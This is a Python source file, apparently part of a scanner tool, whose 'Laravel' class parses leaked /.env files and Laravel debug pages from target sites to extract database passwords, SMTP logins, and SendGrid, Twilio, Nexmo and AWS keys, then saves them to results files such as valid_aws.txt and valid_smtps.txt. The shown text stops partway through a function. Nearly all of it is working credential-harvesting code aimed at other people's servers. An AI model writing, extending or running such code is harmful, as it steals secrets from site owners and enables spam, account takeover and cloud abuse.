import urllib.parse
from re import findall as reg
import base64

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''


class Laravel:

    def databases(self, page, star):
        global url, method, db_database, db_host, db_password, db_username, db_port, db_connection
        try:
            if "DB_CONNECTION=" in page or '<td>DB_CONNECTION</td>' in page:
                if 'DB_CONNECTION=' in page:
                    method = '/.env'
                    try:
                        url = reg('\nAPP_URL=(.*?)\n', page)[0]
                        if "localhost" in url:
                            url = star
                        elif "127.0.0.1" in url:
                            url = star
                        count_slashes = 0
                        for i in url.split("://")[1]:
                            if i == "/":
                                count_slashes += 1
                        if count_slashes >= 1:
                            test = url.split("://")[1].split("/")[0]
                            voorste = url.split("://")[0]
                            url = voorste + "://" + test
                        elif count_slashes == 1:
                            voorste = url.split("://")[0]
                            url = voorste + "://" + url.split("://")[1]
                        elif count_slashes <= 1:
                            url = url
                        else:
                            url = url
                    except:
                        url = star
                    try:
                        db_connection = reg('\nDB_CONNECTION=(.*?)\n', page)[0]
                    except:
                        db_connection = 'mysql'
                    try:
                        db_host = reg('\nDB_HOST=(.*?)\n', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                            if "/" in db_host:
                                db_host = db_host.split("/")[0]
                            else:
                                db_host = db_host
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                            if "/" in db_host:
                                db_host = db_host.split("/")[0]
                            else:
                                db_host = db_host
                        else:
                            if "/" in db_host:
                                db_host = db_host.split("/")[0]
                            else:
                                db_host = db_host
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    try:
                        db_port = reg('\nDB_PORT=(.*?)\n', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_database = reg('\nDB_DATABASE=(.*?)\n', page)[0]
                    except:
                        db_database = ''
                    try:
                        db_username = reg('\nDB_USERNAME=(.*?)\n', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = reg('\nDB_PASSWORD=(.*?)\n', page)[0]
                    except:
                        db_password = ''
                elif '<td>DB_CONNECTION</td>' in page:
                    method = 'debug'
                    try:
                        url = reg('<td>APP_URL<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                        if "localhost" in url:
                            url = star
                        elif "127.0.0.1" in url:
                            url = star
                        count_slashes = 0
                        for i in url.split("://")[1]:
                            if i == "/":
                                count_slashes += 1
                        if count_slashes >= 1:
                            test = url.split("://")[1].split("/")[0]
                            voorste = url.split("://")[0]
                            url = voorste + "://" + test
                        elif count_slashes == 1:
                            voorste = url.split("://")[0]
                            url = voorste + "://" + url.split("://")[1]
                        elif count_slashes <= 1:
                            url = url
                        else:
                            url = url
                    except Exception as e:
                        url = star
                    try:
                        db_connection = reg('<td>DB_CONNECTION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        db_connection = ''
                    try:
                        db_host = reg('<td>DB_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                            if "/" in db_host:
                                db_host = db_host.split("/")[0]
                            else:
                                db_host = db_host
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                            if "/" in db_host:
                                db_host = db_host.split("/")[0]
                            else:
                                db_host = db_host
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        if "/" in db_host:
                            db_host = db_host.split("/")[0]
                        else:
                            db_host = db_host
                    try:
                        db_port = reg('<td>DB_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_database = reg('<td>DB_DATABASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        db_database = ''
                    try:
                        db_username = reg('<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = reg('<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        db_password = ''
                if db_username == '' or db_password == '' or db_username == 'null' or db_password == 'null':
                    return False
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(
                        db_connection) + '\nDB_HOST: ' + str(db_host) + '\nDB_PORT: ' + str(
                        db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
                        db_username) + '\nDB_PASSWORD: ' + str(db_password)
                    remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
                    save = open('Results/DATABASE.txt', 'a')
                    save.write(remover + '\n\n')
                    save.close()
                    return url, method, db_connection, db_host, db_port, db_database, db_username, db_password
            else:
                return False
        except Exception as e:
            return False

    def nexmo_apis(self, page):
        global nexmo_api, nexmo_secretkey
        try:
            if "NEXMO_KEY" in page or '<td>NEXMO_KEY</td>' in page:
                if "NEXMO_KEY=" in page:
                    try:
                        nexmo_api = reg('\nNEXMO_KEY=(.*?)\n', page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        nexmo_api = ''
                    try:
                        nexmo_secretkey = reg('\nNEXMO_SECRET=(.*?)\n', page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        nexmo_secretkey = ''
                elif '<td>NEXMO_KEY</td>' in page:
                    try:
                        nexmo_api = reg('<td>NEXMO_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        nexmo_api = ''
                    try:
                        nexmo_secretkey = reg('<td>NEXMO_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        nexmo_secretkey = ''
                if nexmo_api == '' or nexmo_secretkey == '' or nexmo_api == 'null' or nexmo_secretkey == 'null' or \
                        nexmo_api == '""' or nexmo_secretkey == '""' or nexmo_api == "NEXMO_KEY" or nexmo_secretkey \
                        == "NEXMO_SECRET":
                    return False
                else:
                    build = nexmo_api + '|' + nexmo_secretkey
                    remover = build.replace('\r', '')
                    nexmo = open("Results/nexmo.txt", "a")
                    nexmo.write(remover + '\n')
                    nexmo.close()
                    return nexmo_api, nexmo_secretkey
            else:
                return False
        except Exception as e:
            return False

    def twilio_apis(self, page):
        global acc_key, acc_sec
        try:
            if "TWILIO_SID=" in page or "TWILIO_AUTH_TOKEN=" in page or "<td>TWILIO_API_SID</td>" in page:
                if "<td>TWILIO_API_SID</td>" in page:
                    try:
                        acc_key = reg('<td>TWILIO_API_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        acc_key = ''
                    try:
                        acc_sec = reg('<td>TWILIO_API_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        acc_sec = ''
                elif "TWILIO_SID=" in page:
                    try:
                        acc_key = reg("\nTWILIO_SID=(.*?)\n", page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        acc_key = ''
                    try:
                        acc_sec = reg("\nTWILIO_TOKEN=(.*?)\n", page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        acc_sec = ''
                elif "TWILIO_AUTH_TOKEN=" in page:
                    try:
                        acc_key = reg("\nTWILIO_SID=(.*?)\n", page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        acc_key = ''
                    try:
                        acc_sec = reg("\nTWILIO_AUTH_TOKEN=(.*?)\n", page)[0].replace(
                            "'", "").replace('"', '').replace(" ", "").replace('"', '')
                    except:
                        acc_sec = ''
                if acc_key == '' or acc_sec == '' or acc_key == 'null' or acc_sec == 'null' or acc_key == '""' or \
                        acc_sec == '""' or acc_key == "TWILIO_SID" or acc_sec == "TWILIO_TOKEN":
                    return False
                else:
                    build = acc_key + '|' + acc_sec
                    remover = build.replace('\r', '')
                    twill = open("Results/valid_twilio.txt", "a")
                    twill.write(remover + '\n')
                    twill.close()
                    return acc_key, acc_sec
            else:
                return False
        except Exception:
            return False

    def smtps(self, page, star):
        global smtp_username, smtp_password, smtp_host, smtp_port, smtp_from, smtp_name
        method = "/.env"
        try:
            if "MAIL_HOST=" in page or "<td>MAIL_HOST</td>" in page or "EMAIL_HOST=" in page:
                if "MAIL_HOST=" in page:
                    try:
                        smtp_host = reg("\nMAIL_HOST=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_host = ''
                    try:
                        smtp_username = reg("\nMAIL_USERNAME=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_username = ''
                    try:
                        smtp_password = reg("\nMAIL_PASSWORD=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_password = ''
                    try:
                        smtp_port = reg("\nMAIL_PORT=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_port = "587"
                    try:
                        smtp_from = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_from = smtp_username
                    try:
                        smtp_name = reg("\nMAIL_FROM_NAME=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_name = ''
                elif "SMTP_HOST=" in page:
                    try:
                        smtp_host = reg("\nSMTP_HOST=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_host = ''
                    try:
                        smtp_username = reg("\nSMTP_USERNAME=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_username = ''
                    try:
                        smtp_password = reg("\nSMTP_PASSWORD=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_password = ''
                    try:
                        smtp_port = reg("\nSMTP_PORT=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_port = "587"
                    try:
                        smtp_from = reg("\nSMTP_FROM_ADDRESS=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_from = smtp_username
                    try:
                        smtp_name = reg("\nSMTP_FROM_NAME=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_name = ''
                elif "EMAIL_HOST=" in page:
                    try:
                        smtp_host = reg("\nEMAIL_HOST=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_host = ''
                    try:
                        smtp_username = reg("\nEMAIL_HOST_USER=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_username = ''
                    try:
                        smtp_password = reg("\nEMAIL_HOST_PASSWORD=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_password = ''
                    try:
                        smtp_port = reg("\nEMAIL_PORT=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_port = "587"
                    try:
                        smtp_from = reg("\nEMAIL_FROM_ADDRESS=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_from = smtp_username
                    try:
                        smtp_name = reg("\nEMAIL_FROM_NAME=(.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_name = ''
                elif "<td>MAIL_HOST</td>" in page:
                    try:
                        smtp_host = reg('<td>MAIL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_host = ''
                    try:
                        smtp_username = reg('<td>MAIL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]. \
                            replace("\n", "").replace("\r", "").replace('"', '')
                    except:
                        smtp_username = ''
                    try:
                        smtp_password = reg('<td>MAIL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]. \
                            replace("\n", "").replace("\r", "").replace('"', '')
                    except:
                        smtp_password = ''
                    try:
                        smtp_port = str(
                            reg('<td>MAIL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0].replace("\n", "").replace(
                                "\r", "").replace('"', ''))
                    except:
                        smtp_port = "587"
                    try:
                        smtp_from = reg("<td>MAIL_FROM_ADDRESS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0]. \
                            replace("\n", "").replace("\r", "").replace('"', '')
                    except:
                        smtp_from = smtp_username
                    try:
                        smtp_name = reg("<td>MAIL_FROM_NAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0]. \
                            replace("\n", "").replace("\r", "").replace('"', '')
                    except:
                        smtp_name = ''
                if smtp_username == '' or smtp_password == '' or smtp_username == 'null' or smtp_password == 'null' or \
                        smtp_username == '""' or smtp_password == '""' or smtp_host == "smtp.mailtrap.io" or \
                        smtp_username == "SMTP_USERNAME" and smtp_password == "SMTP_PASSWORD":
                    return False
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                        smtp_host) + '\nMAILPORT: ' + str(smtp_port) + '\nMAILUSER: ' + str(
                        smtp_username) + '\nMAILPASS: ' + str(smtp_password) + '\nMAILFROM: ' + str(
                        smtp_from) + '\nFROMNAME: ' + str(smtp_name)
                    if "apikey" in smtp_username and "sendgrid" in smtp_host:
                        builder = str(smtp_username) + '|' + smtp_password
                        remover = builder.replace('\r', '')
                        sendgridsmtp = open('Results/sendgrid_api.txt', 'a')
                        sendgridsmtp.write(remover + '\n')
                        sendgridsmtp.close()
                        remover = str(build).replace('\r', '')
                        sendgridlong = open('Results/sendgrid_api_full.txt', 'a')
                        sendgridlong.write(remover + '\n\n')
                        sendgridlong.close()
                        return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
                    else:
                        remover = build.replace('\r', '')
                        smtps = open("Results/valid_smtps.txt", "a")
                        smtps.write(remover + '\n\n')
                        smtps.close()
                        return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
            else:
                return False
        except:
            return False

    def laravel_dns(self, page, star):
        method = "/laravel_dns_urls"
        global db_connection, db_username, db_password, db_host, db_database
        try:
            if "DATABASE_URL=" in page:
                try:
                    database_url = reg("\nDATABASE_URL=(.*?)\n", page)[0]
                except:
                    database_url = ''
                try:
                    db_connection = database_url.split("://")[0].replace('"', "").replace("'", "")
                except:
                    db_connection = ''
                try:
                    db_host = database_url.split("@")[1].split(":")[0]
                    if "localhost" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    elif "127.0.0.1" in db_host:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                except:
                    db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                try:
                    db_port = database_url.split("@")[1].split(":")[1].split("/")[0]
                    if db_port == "null":
                        db_port = "3306"
                    else:
                        db_port = db_port
                except:
                    if db_connection == "mysql":
                        db_port = "3306"
                    elif db_connection == "pgsql":
                        db_port = "5432"
                    elif db_connection == "mongodb":
                        db_port = "27017"
                    else:
                        db_port = "3306"
                try:
                    db_username = database_url.split("://")[1].split("@")[0].split(":")[0]
                except:
                    db_username = ''
                try:
                    db_password = database_url.split("://")[1].split("@")[0].split(":")[1]
                except:
                    db_password = ''
                try:
                    db_database = database_url.split("@")[1].split(":")[1].split("/")[1]
                    if "?" in db_database:
                        db_database = db_database.split("?")[0]
                    else:
                        db_database = db_database
                except:
                    db_database = db_username
                if db_username == '' or db_password == '' or db_username == 'null' or db_password == 'null' or \
                        db_username == "${DB_USER}" or db_password == "${DB_PASSWORD}":
                    return False
                else:
                    url = star
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(
                        db_connection) + '\nDB_HOST: ' + str(db_host) + '\nDB_PORT: ' + str(
                        db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
                        db_username) + '\nDB_PASSWORD: ' + str(db_password)
                    remover = str(build).replace('\r', '')
                    save = open('Results/DATABASE.txt', 'a')
                    save.write(urllib.parse.unquote(remover) + '\n\n')
                    save.close()
                    return url, method, db_connection, db_host, db_port, db_database, db_username, db_password
            else:
                return False
        except Exception as e:
            return False

    def amazon(self, page):
        global aws_key, aws_sec, aws_reg
        try:
            if "AWS_ACCESS_KEY_ID=" in page or "SES_KEY=" in page or "<td>AWS_ACCESS_KEY_ID</td>" in page or "AWS_KEY=" in page:
                if "AWS_ACCESS_KEY_ID=" in page:
                    try:
                        aws_key = reg("AWS_ACCESS_KEY_ID=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("AWS_SECRET_ACCESS_KEY=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        aws_reg = reg("AWS_DEFAULT_REGION=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_reg = 'us-east-2'
                elif "<td>AWS_ACCESS_KEY_ID</td>" in page:
                    try:
                        aws_key = reg("<td>AWS_ACCESS_KEY_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        aws_reg = reg("<td>AWS_DEFAULT_REGION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_reg = 'us-east-2'
                elif "AWS_KEY=" in page:
                    try:
                        aws_key = reg("AWS_KEY=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("AWS_SECRET=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        aws_reg = reg("AWS_REGION=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_reg = 'us-east-2'
                elif "SES_KEY=" in page:
                    try:
                        aws_key = reg("SES_KEY=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("SES_SECRET=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        aws_reg = reg("SES_REGION=(.*?)\n", page)[0].replace('"', "").replace(
                            "'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_reg = 'us-east-2'
                if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null' or aws_key == '""' or \
                        aws_sec == '""' or aws_key == "''" or aws_sec == "''":
                    return False
                else:
                    build = aws_key + '|' + aws_sec + '|' + aws_reg
                    if "||" in build:
                        return False
                    return aws_key, aws_sec, aws_reg
            else:
                return False
        except Exception as e:
            return False

    def amazon_sessie(self, page):
        global aws_key, aws_sec, aws_session, aws_region
        try:
            if "AWS_ACCESS_KEY_ID=" in page:
                if "AWS_ACCESS_KEY_ID=" in page:
                    try:
                        aws_key = reg("AWS_ACCESS_KEY_ID=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("AWS_SECRET_ACCESS_KEY=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        aws_session = reg("AWS_SESSION_TOKEN=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                        get_region = base64.b64decode(aws_session)
                        aws_region = self.get_aws_region(str(get_region)).strip().replace("\n", "").replace("\r", "")
                    except:
                        aws_region = "us-east-2"
                if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null' or aws_key == '""' or \
                        aws_sec == '""' or aws_key == "''" or aws_sec == "''":
                    return False
                else:
                    build = aws_key + '|' + aws_sec + '|' + aws_region
                    if "||" in build:
                        return False
                    return aws_key, aws_sec, aws_region
            else:
                return False
        except Exception as e:
            return False

    def get_aws_region(self, page):
        reg = False
        for region in list_region.splitlines():
            if str(region) in page:
                return region
                break

    def get_aws_data(self, page):
        global aws_reg, aws_key, aws_sec
        try:
            if "AWS_ACCESS_KEY_ID" in page:
                if "AWS_ACCESS_KEY_ID=" in page:
                    try:
                        aws_key = reg("AWS_ACCESS_KEY_ID=(.*?)\n", page)[0].replace('"', "").replace(
                            "'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("AWS_SECRET_ACCESS_KEY=(.*?)\n", page)[0].replace('"', "").replace(
                            "'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                elif "<td>AWS_ACCESS_KEY_ID</td>" in page:
                    try:
                        aws_key = reg("<td>AWS_ACCESS_KEY_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = aws_key + '|' + aws_sec + '|' + aws_reg
                    if "||" in build:
                        return False
                    remover = str(build).replace('\r', '').replace('"', "")
                    save2 = open('Results/valid_aws.txt', 'a')
                    save2.write(remover + '\n')
                    save2.close()
                    return aws_key, aws_sec, aws_reg
            elif "AWS_KEY" in page:
                if "AWS_KEY=" in page:
                    try:
                        aws_key = reg("AWS_KEY=(.*?)\n", page)[0].replace('"', "").replace("'", "").replace(
                            ' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("AWS_SECRET=(.*?)\n", page)[0].replace('"', "").replace("'", "").replace(
                            ' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                elif "<td>AWS_KEY</td>" in page:
                    try:
                        aws_key = reg("<td>AWS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                if aws_key == '' and aws_sec == '':
                    return False
                else:
                    build = aws_key + '|' + aws_sec + '|' + aws_reg
                    if "||" in build:
                        return False
                    remover = str(build).replace('\r', '').replace('"', "")
                    save2 = open('Results/valid_aws.txt', 'a')
                    save2.write(remover + '\n')
                    save2.close()
                    return aws_key, aws_sec, aws_reg
            elif "AWS_SNS_KEY" in page:
                if "AWS_SNS_KEY=" in page:
                    try:
                        aws_key = reg("AWS_SNS_KEY=(.*?)\n", page)[0].replace('"', "").replace(
                            "'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("AWS_SNS_SECRET=(.*?)\n", page)[0].replace('"', "").replace(
                            "'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                elif "<td>AWS_SNS_KEY</td>" in page:
                    try:
                        aws_key = reg("<td>AWS_SNS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SNS_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                if aws_key == '' and aws_sec == '':
                    return False
                else:
                    build = aws_key + '|' + aws_sec + '|' + aws_reg
                    if "||" in build:
                        return False
                    remover = str(build).replace('\r', '').replace('"', "")
                    save2 = open('Results/valid_aws.txt', 'a')
                    save2.write(remover + '\n')
                    save2.close()
                    return aws_key, aws_sec, aws_reg
            elif "AWS_S3_KEY" in page:
                if "AWS_S3_KEY=" in page:
                    try:
                        aws_key = reg("AWS_S3_KEY=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("AWS_S3_SECRET=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_S3_KEY</td>" in page:
                    try:
                        aws_key = reg("<td>AWS_S3_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_S3_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                if aws_key == '' and aws_sec == '':
                    return False
                else:
                    build = aws_key + '|' + aws_sec + '|' + aws_reg
                    if "||" in build:
                        return False
                    remover = str(build).replace('\r', '').replace('"', "")
                    save2 = open('Results/valid_aws.txt', 'a')
                    save2.write(remover + '\n')
                    save2.close()
                    return aws_key, aws_sec, aws_reg
            elif "AWS_SES_KEY" in page:
                if "AWS_SES_KEY=" in page:
                    try:
                        aws_key = reg("AWS_SES_KEY=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("AWS_SES_SECRET=(.*?)\n", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                elif "<td>AWS_SES_KEY</td>" in page:
                    try:
                        aws_key = reg("<td>AWS_SES_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SES_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
